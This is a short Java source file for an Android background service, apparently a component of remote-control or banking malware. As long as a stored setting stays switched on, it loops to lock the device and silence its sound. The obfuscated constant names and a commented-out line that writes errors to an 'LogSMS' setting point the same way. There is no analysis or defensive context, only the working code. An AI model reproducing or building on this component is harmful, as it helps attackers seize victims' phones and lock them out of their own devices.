package com.example.mmm.Service;

import android.app.IntentService;
import android.content.Intent;

import com.example.mmm.Utils.utils;
import com.example.mmm.constants;

public class srvLockDevice extends IntentService {
    utils utl = new utils();
    constants consts = new constants();
    public srvLockDevice() {
        super("");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        try {
            while (true) {
                utl.chalkTile(10);
                utl.lockDevice(this);
                utl.stopSound(this);
                if (!utl.SettingsRead(this, consts.lockDevice).equals(consts.str_1)) {
                    break;
                }
            }
        }catch (Exception ex){
        //    utl.SettingsToAdd(this, consts.LogSMS , consts.string_151 + ex.toString() + consts.string_119);
        }
       stopSelf();
    }
}
